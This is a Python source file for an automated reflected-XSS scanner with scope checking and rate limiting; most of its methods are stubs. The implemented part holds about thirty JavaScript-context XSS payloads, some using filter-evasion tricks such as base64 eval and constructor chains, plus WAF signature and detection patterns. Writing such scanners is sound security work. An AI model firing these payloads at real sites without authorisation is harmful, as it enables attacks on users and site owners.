"""Automated XSS vulnerability detection engine.

Zero LLM cost — pure deterministic HTTP testing.
Tests reflected XSS across multiple injection contexts: HTML attribute, HTML tag,
JavaScript string/expression/template, URL, CSS, and DOM-based sinks.

Each context has dedicated payloads designed to break out of the specific
syntactic position and achieve JavaScript execution.

References:
- OWASP XSS Prevention Cheat Sheet
- PortSwigger XSS Cheat Sheet (context-dependent payloads)
- HTML5 Security Cheatsheet (html5sec.org)
- Cure53 mXSS research (mutation XSS)
- HackerOne XSS reports (#297968, #470206, #948929)
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import time
from typing import Any

import httpx
import structlog

from ai_brain.active.deterministic_tools import _make_client
from ai_brain.active.scope_guard import ActiveScopeGuard

logger = structlog.get_logger()

# Canary prefix for reflection detection — random-looking to avoid WAF signatures.
_CANARY_PREFIX = "xSsC4n4ry"

# Non-resolving attacker domain for payload generation — safe for detection.
_EVIL_DOMAIN = "evil.example.com"

# Supported injection contexts for XSS testing.
_SUPPORTED_CONTEXTS = [
    "html_attribute",
    "html_tag",
    "js_string_single",
    "js_string_double",
    "js_template_literal",
    "js_expression",
    "js_json_in_script",
    "url_context",
    "css_context",
    "dom_based",
]

# WAF block signatures — response is a WAF block, not real app behaviour.
_WAF_SIGNATURES = [
    "cloudflare",
    "aws waf",
    "akamai",
    "incapsula",
    "sucuri",
    "mod_security",
    "web application firewall",
    "blocked",
    "request blocked",
    "access denied",
    "forbidden",
]

# Patterns indicating XSS payload execution in response.
_XSS_TRIGGER_PATTERNS = [
    re.compile(r"<script[^>]*>.*?alert\s*\(", re.IGNORECASE | re.DOTALL),
    re.compile(r"onerror\s*=\s*[\"']?alert", re.IGNORECASE),
    re.compile(r"onload\s*=\s*[\"']?alert", re.IGNORECASE),
    re.compile(r"onfocus\s*=\s*[\"']?alert", re.IGNORECASE),
    re.compile(r"onmouseover\s*=\s*[\"']?alert", re.IGNORECASE),
    re.compile(r"javascript\s*:\s*alert", re.IGNORECASE),
    re.compile(r"<img[^>]+onerror\s*=", re.IGNORECASE),
    re.compile(r"<svg[^>]+onload\s*=", re.IGNORECASE),
]


def _make_xss_client(socks_proxy: str | None = None) -> httpx.AsyncClient:
    """Create an httpx client for XSS testing."""
    return _make_client(
        socks_proxy=socks_proxy,
        timeout=10,
        follow_redirects=True,
    )


def _generate_canary(param: str) -> str:
    """Generate a unique canary string for reflection detection."""
    h = hashlib.md5(f"{param}:{time.time()}".encode()).hexdigest()[:8]
    return f"{_CANARY_PREFIX}{h}"


def _is_waf_blocked(resp: httpx.Response) -> bool:
    """Check if the response is a WAF block page."""
    if resp.status_code in (403, 406, 429, 503):
        body_lower = resp.text[:2000].lower()
        return any(sig in body_lower for sig in _WAF_SIGNATURES)
    return False


def _payload_reflected(resp: httpx.Response, payload: str) -> bool:
    """Check if the payload is reflected in the response body."""
    if resp.status_code >= 400:
        return False
    body = resp.text
    return payload in body


def _xss_fires_in_response(resp: httpx.Response) -> bool:
    """Check if XSS trigger patterns are present in the response."""
    body = resp.text[:50000]
    return any(pat.search(body) for pat in _XSS_TRIGGER_PATTERNS)


def _detect_reflection_context(body: str, canary: str) -> str | None:
    """Detect the injection context of a reflected canary.

    Returns the context string or None if canary is not reflected.
    """
    if canary not in body:
        return None

    idx = body.index(canary)
    # Look at surrounding context (500 chars before and after)
    before = body[max(0, idx - 500): idx]
    after = body[idx + len(canary): idx + len(canary) + 500]

    # Check if inside a <script> block
    last_script_open = before.rfind("<script")
    last_script_close = before.rfind("</script")
    if last_script_open > last_script_close:
        # Inside a script tag
        # Check for string context
        before_trimmed = before[last_script_open:]
        # Single-quoted JS string
        if re.search(r"'[^']*$", before_trimmed) and re.search(r"^[^']*'", after):
            return "js_string_single"
        # Double-quoted JS string
        if re.search(r'"[^"]*$', before_trimmed) and re.search(r'^[^"]*"', after):
            return "js_string_double"
        # Template literal
        if re.search(r"`[^`]*$", before_trimmed):
            return "js_template_literal"
        # JSON context (look for { before and } after)
        if re.search(r"[{,]\s*$", before_trimmed.rstrip()):
            return "js_json_in_script"
        return "js_expression"

    # Check if inside an HTML attribute
    attr_match = re.search(
        r'<\w+[^>]*\w+\s*=\s*["\'][^"\']*$', before, re.IGNORECASE
    )
    if attr_match:
        return "html_attribute"

    # Check if inside a style block or attribute
    if re.search(r"<style[^>]*>[^<]*$", before, re.IGNORECASE):
        return "css_context"
    if re.search(r'style\s*=\s*["\'][^"\']*$', before, re.IGNORECASE):
        return "css_context"

    # Check URL context (href, src, action attributes)
    if re.search(
        r'(?:href|src|action|formaction)\s*=\s*["\'][^"\']*$',
        before,
        re.IGNORECASE,
    ):
        return "url_context"

    # Default: HTML tag context (between tags)
    return "html_tag"


class XSSAttackEngine:
    """Automated XSS vulnerability detection engine. $0 LLM cost.

    Tests reflected XSS across multiple injection contexts with dedicated
    payloads for each syntactic position. Detects reflection, identifies
    context, and validates payload execution.
    """

    def __init__(
        self,
        scope_guard: ActiveScopeGuard | None = None,
        socks_proxy: str | None = None,
    ):
        self._scope_guard = scope_guard
        self._socks_proxy = socks_proxy
        self._request_count = 0
        self._rate_delay = 0.3  # 300ms between requests

    def _in_scope(self, url: str) -> bool:
        """Check if a URL is in scope."""
        if not self._scope_guard:
            return True
        return self._scope_guard.is_in_scope(url)

    async def _send(
        self, client: httpx.AsyncClient, method: str, url: str, **kwargs: Any
    ) -> httpx.Response | None:
        """Send an HTTP request with rate limiting and error handling."""
        if not self._in_scope(url):
            logger.warning("xss_scope_violation", url=url[:120])
            return None
        self._request_count += 1
        await asyncio.sleep(self._rate_delay)
        try:
            return await client.request(method, url, **kwargs)
        except Exception as e:
            logger.debug("xss_request_error", url=url[:120], error=str(e)[:100])
            return None

    # ──────────────────────────────────────────────────────────────────
    # Payload builders
    # ──────────────────────────────────────────────────────────────────

    def _build_html_attribute_payloads(self) -> list[dict[str, str]]:
        """Build payloads for HTML attribute context injection.

        Stub — implemented by Unit 2.
        """
        return []

    def _build_html_tag_payloads(self) -> list[dict[str, str]]:
        """Build payloads for HTML tag context injection.

        Stub — implemented by Unit 3.
        """
        return []

    def _build_js_context_payloads(self) -> list[dict[str, str]]:
        """Build payloads for JavaScript context injection (~30 payloads).

        Covers single-quoted strings, double-quoted strings, template
        literals, JSON-in-script blocks, and raw JS expression context.
        """
        payloads: list[dict[str, str]] = []

        # ── Single-quoted JS string breakouts (8) ──
        payloads.append({
            "payload": "'-alert(1)-'",
            "description": "Break out of single-quoted JS string using arithmetic context",
            "context": "js_string_single",
            "technique": "js_single_quote_arithmetic",
        })
        payloads.append({
            "payload": "';alert(1)//",
            "description": "Terminate single-quoted string and inject statement",
            "context": "js_string_single",
            "technique": "js_single_quote_statement",
        })
        payloads.append({
            "payload": "\\';alert(1)//",
            "description": "Escape the escape character to break single-quoted string",
            "context": "js_string_single",
            "technique": "js_single_quote_escape_bypass",
        })
        payloads.append({
            "payload": "</script><script>alert(1)</script>",
            "description": "Close script tag and inject new script (single-quoted context)",
            "context": "js_string_single",
            "technique": "js_single_quote_script_break",
        })
        payloads.append({
            "payload": "\\\\';alert(1)//",
            "description": "Double backslash to neutralize escape and break single-quoted string",
            "context": "js_string_single",
            "technique": "js_single_quote_double_escape",
        })
        payloads.append({
            "payload": "'-eval(atob('YWxlcnQoMSk='))-'",
            "description": "Base64-encoded alert via eval to bypass keyword filters",
            "context": "js_string_single",
            "technique": "js_single_quote_base64_eval",
        })
        payloads.append({
            "payload": "'-[].constructor.constructor('alert(1)')()-'",
            "description": "Function constructor to bypass direct function name filters",
            "context": "js_string_single",
            "technique": "js_single_quote_constructor",
        })
        payloads.append({
            "payload": "'-window['alert'](1)-'",
            "description": "Bracket notation property access to bypass dot notation filters",
            "context": "js_string_single",
            "technique": "js_single_quote_bracket_access",
        })

        # ── Double-quoted JS string breakouts (6) ──
        payloads.append({
            "payload": '"-alert(1)-"',
            "description": "Break out of double-quoted JS string using arithmetic context",
            "context": "js_string_double",
            "technique": "js_double_quote_arithmetic",
        })
        payloads.append({
            "payload": '";alert(1)//',
            "description": "Terminate double-quoted string and inject statement",
            "context": "js_string_double",
            "technique": "js_double_quote_statement",
        })
        payloads.append({
            "payload": '\\";alert(1)//',
            "description": "Escape the escape character to break double-quoted string",
            "context": "js_string_double",
            "technique": "js_double_quote_escape_bypass",
        })
        payloads.append({
            "payload": "</script><script>alert(1)</script>",
            "description": "Close script tag and inject new script (double-quoted context)",
            "context": "js_string_double",
            "technique": "js_double_quote_script_break",
        })
        payloads.append({
            "payload": '\\\\";alert(1)//',
            "description": "Double backslash to neutralize escape and break double-quoted string",
            "context": "js_string_double",
            "technique": "js_double_quote_double_escape",
        })
        payloads.append({
            "payload": '"-eval(String.fromCharCode(97,108,101,114,116,40,49,41))-"',
            "description": "String.fromCharCode to bypass keyword filters in double-quoted context",
            "context": "js_string_double",
            "technique": "js_double_quote_fromcharcode",
        })

        # ── Template literal breakouts (5) ──
        payloads.append({
            "payload": "${alert(1)}",
            "description": "Template literal expression injection via ${} syntax",
            "context": "js_template_literal",
            "technique": "js_template_expression",
        })
        payloads.append({
            "payload": "${constructor.constructor('alert(1)')()}",
            "description": "Function constructor in template literal expression",
            "context": "js_template_literal",
            "technique": "js_template_constructor",
        })
        payloads.append({
            "payload": "`+alert(1)+`",
            "description": "Break out of template literal with backtick concatenation",
            "context": "js_template_literal",
            "technique": "js_template_backtick_break",
        })
        payloads.append({
            "payload": "${[].find(alert)}",
            "description": "Array.find with alert as callback in template literal",
            "context": "js_template_literal",
            "technique": "js_template_array_find",
        })
        payloads.append({
            "payload": "${eval(atob('YWxlcnQoMSk='))}",
            "description": "Base64-decoded eval inside template literal expression",
            "context": "js_template_literal",
            "technique": "js_template_base64_eval",
        })

        # ── JSON-in-script context (5) ──
        payloads.append({
            "payload": "</script><script>alert(1)</script>",
            "description": "Break out of JSON-in-script by closing script tag",
            "context": "js_json_in_script",
            "technique": "js_json_script_break",
        })
        payloads.append({
            "payload": '"};alert(1);//',
            "description": "Close JSON object and inject statement after JSON block",
            "context": "js_json_in_script",
            "technique": "js_json_object_break",
        })
        payloads.append({
            "payload": '"}]}\'alert(1);//',
            "description": "Close nested JSON structures and inject statement",
            "context": "js_json_in_script",
            "technique": "js_json_nested_break",
        })
        payloads.append({
            "payload": "\\u003c/script\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "description": "Unicode-escaped script tag break for JSON context",
            "context": "js_json_in_script",
            "technique": "js_json_unicode_script_break",
        })
        payloads.append({
            "payload": '\\u0022;alert(1)//',
            "description": "Unicode-escaped double quote to break JSON string value",
            "context": "js_json_in_script",
            "technique": "js_json_unicode_quote_break",
        })

        # ── JS expression context (6) ──
        payloads.append({
            "payload": "1;alert(1)//",
            "description": "Semicolon injection to append alert in expression context",
            "context": "js_expression",
            "technique": "js_expr_semicolon",
        })
        payloads.append({
            "payload": "1,alert(1)//",
            "description": "Comma operator to chain alert in expression context",
            "context": "js_expression",
            "technique": "js_expr_comma",
        })
        payloads.append({
            "payload": ";alert(1)//",
            "description": "Bare semicolon to start new statement in expression context",
            "context": "js_expression",
            "technique": "js_expr_bare_semicolon",
        })
        payloads.append({
            "payload": "}alert(1)//{",
            "description": "Close block and inject alert in block expression context",
            "context": "js_expression",
            "technique": "js_expr_block_break",
        })
        payloads.append({
            "payload": "};alert(1);//",
            "description": "Close block with semicolon and inject alert statement",
            "context": "js_expression",
            "technique": "js_expr_block_semicolon",
        })
        payloads.append({
            "payload": "*/alert(1)/*",
            "description": "Close multi-line comment and inject alert",
            "context": "js_expression",
            "technique": "js_expr_comment_break",
        })

        return payloads

    def _build_url_context_payloads(self) -> list[dict[str, str]]:
        """Build payloads for URL context injection (href, src, action).

        Stub — implemented by Unit 5.
        """
        return []

    def _build_css_context_payloads(self) -> list[dict[str, str]]:
        """Build payloads for CSS context injection.

        Stub — implemented by Unit 6.
        """
        return []

    def _build_dom_payloads(self) -> list[dict[str, str]]:
        """Build payloads for DOM-based XSS testing.

        Stub — implemented by Unit 7.
        """
        return []

    # ──────────────────────────────────────────────────────────────────
    # Context-specific test methods
    # ──────────────────────────────────────────────────────────────────

    async def test_reflected_html_attribute(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test reflected XSS in HTML attribute context.

        Stub — implemented by Unit 2.
        """
        return []

    async def test_reflected_html_tag(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test reflected XSS in HTML tag context.

        Stub — implemented by Unit 3.
        """
        return []

    async def _send_with_param(
        self,
        client: httpx.AsyncClient,
        method: str,
        url: str,
        request_params: dict[str, str],
    ) -> httpx.Response | None:
        """Send a request injecting *request_params* via query string or form body."""
        if method == "GET":
            return await self._send(client, "GET", url, params=request_params)
        return await self._send(client, "POST", url, data=request_params)

    async def test_reflected_js_context(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test reflected XSS in JavaScript context.

        Sends each JS context payload and checks if the payload is
        reflected unescaped in the response within a <script> block,
        indicating potential XSS.

        Args:
            url: Target URL to test.
            method: HTTP method (GET or POST).
            param: The parameter name to inject into.
            params: Additional parameters to include in the request.

        Returns:
            List of finding dicts for each confirmed reflection.
        """
        if not self._in_scope(url):
            return []

        method = method.upper()
        findings: list[dict[str, Any]] = []
        payloads = self._build_js_context_payloads()
        base_params = dict(params or {})

        # First, send a canary to confirm parameter is reflected
        canary = _generate_canary(param)

        async with _make_xss_client(self._socks_proxy) as client:
            canary_resp = await self._send_with_param(
                client, method, url, {**base_params, param: canary},
            )

            if canary_resp is None:
                return []

            if _is_waf_blocked(canary_resp):
                logger.info("xss_waf_blocked", url=url[:120], param=param)
                return []

            if canary not in canary_resp.text:
                logger.debug(
                    "xss_no_reflection",
                    url=url[:120],
                    param=param,
                )
                return []

            # Detect the reflection context from canary response
            detected_context = _detect_reflection_context(canary_resp.text, canary)
            logger.info(
                "xss_reflection_detected",
                url=url[:120],
                param=param,
                context=detected_context,
            )

            # Filter payloads to prioritize those matching the detected context
            if detected_context:
                matching = [p for p in payloads if p["context"] == detected_context]
                non_matching = [p for p in payloads if p["context"] != detected_context]
                ordered_payloads = matching + non_matching
            else:
                ordered_payloads = payloads

            for payload_info in ordered_payloads:
                payload_value = payload_info["payload"]
                resp = await self._send_with_param(
                    client, method, url, {**base_params, param: payload_value},
                )

                if resp is None:
                    continue

                if _is_waf_blocked(resp):
                    logger.debug(
                        "xss_payload_waf_blocked",
                        technique=payload_info["technique"],
                    )
                    continue

                # Check for payload reflection in the response
                reflected = _payload_reflected(resp, payload_value)
                fires = _xss_fires_in_response(resp) if reflected else False

                if reflected:
                    # Determine injection context of the reflected payload
                    injection_ctx = _detect_reflection_context(
                        resp.text, payload_value
                    )

                    # Build evidence snippet (surrounding text)
                    body = resp.text
                    idx = body.index(payload_value)
                    snippet_start = max(0, idx - 80)
                    snippet_end = min(len(body), idx + len(payload_value) + 80)
                    snippet = body[snippet_start:snippet_end]

                    findings.append({
                        "vulnerable": True,
                        "technique": payload_info["technique"],
                        "description": payload_info["description"],
                        "payload": payload_value,
                        "response_status": resp.status_code,
                        "severity": "high" if fires else "medium",
                        "evidence": (
                            f"Payload reflected in response "
                            f"(HTTP {resp.status_code}). "
                            f"Context: {injection_ctx or 'unknown'}. "
                            f"XSS fires: {fires}. "
                            f"Snippet: {snippet[:300]}"
                        ),
                        "cves": ["CWE-79"],
                        "injection_context": injection_ctx or payload_info["context"],
                        "xss_fires": fires,
                        "param": param,
                        "url": url,
                        "method": method,
                    })
                    logger.info(
                        "xss_finding",
                        technique=payload_info["technique"],
                        context=injection_ctx,
                        fires=fires,
                        url=url[:120],
                        param=param,
                    )

        return findings

    async def test_reflected_url_context(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test reflected XSS in URL context (href, src, action).

        Stub — implemented by Unit 5.
        """
        return []

    async def test_reflected_css_context(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test reflected XSS in CSS context.

        Stub — implemented by Unit 6.
        """
        return []

    async def test_dom_based(
        self,
        url: str,
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test DOM-based XSS via source/sink analysis.

        Stub — implemented by Unit 7.
        """
        return []

    # ──────────────────────────────────────────────────────────────────
    # Orchestration
    # ──────────────────────────────────────────────────────────────────

    async def scan_parameter(
        self,
        url: str,
        method: str = "GET",
        param: str = "",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Run all XSS context tests against a single parameter.

        Detects the reflection context first, then runs the appropriate
        context-specific test. Falls back to testing all contexts if
        detection is inconclusive.

        Stub — implemented by Unit 8 (orchestration).
        """
        return []

    async def scan_url(
        self,
        url: str,
        method: str = "GET",
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Scan all parameters of a URL for XSS.

        Automatically extracts parameters from the URL query string
        and tests each one individually.

        Stub — implemented by Unit 8 (orchestration).
        """
        return []
